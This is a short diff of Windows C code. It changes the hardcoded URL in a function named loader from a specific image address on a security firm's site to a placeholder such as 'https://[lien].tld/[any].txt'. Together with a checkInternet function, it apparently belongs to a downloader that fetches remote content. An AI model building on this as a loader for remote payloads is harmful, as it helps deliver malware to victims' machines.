@@ -21,7 +21,7 @@ int checkInternet(){
 }
 
 int loader(){
-    char url[BUFSIZE] = "https://www.algosecure.fr/img/illustrations/investigation-forensic-cover.jpg";
+    char url[BUFSIZE] = "https://[lien].tld/[any].txt";
     char buff[BUFSIZE];
     DWORD bytesRead;
     HANDLE hdl, hdl2;
